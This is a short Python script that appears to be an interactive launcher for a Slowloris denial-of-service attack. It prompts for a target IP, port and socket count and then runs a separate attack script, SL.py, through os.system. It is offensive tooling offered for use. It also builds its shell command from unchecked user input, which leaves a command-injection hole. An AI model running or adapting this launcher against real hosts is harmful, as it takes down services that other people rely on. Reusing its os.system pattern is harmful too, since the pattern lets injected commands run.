#!/usr/bin/env python3
import os

confirm_str = "n"

f = open('SlowLorisHeader.txt', 'r')
timmiller32 = f.read()
f.close()

print(timmiller32)

print("**CTRL + C to Quit**")

ip1 = input("Enter Target IP >> ")

port1 = input("Enter Target Port (80 for websites, vulnerable port for hosts) >> ")

socket1 = input("Enter Number of Sockets >> ")
print("\n")
print("************************ SLOWLORIS *******************************")
print("\n")
print("You have entered: ")
print("Target IP >> " + ip1)
print("Target Port >> " + port1)
print("Sockets >> " + socket1)
print("\n")
print("*******************************************************************")
print("                        Is This Correct?                           ")
print("*******************************************************************")
print("\n")

confirm1 = input("(y/n) >> ")

if confirm1 == 'y':
    os.system("SL.py " + ip1 + " -p " + port1 + " -s " + socket1)

if confirm1 == 'n':
    os.system("py SlowLoris.py")



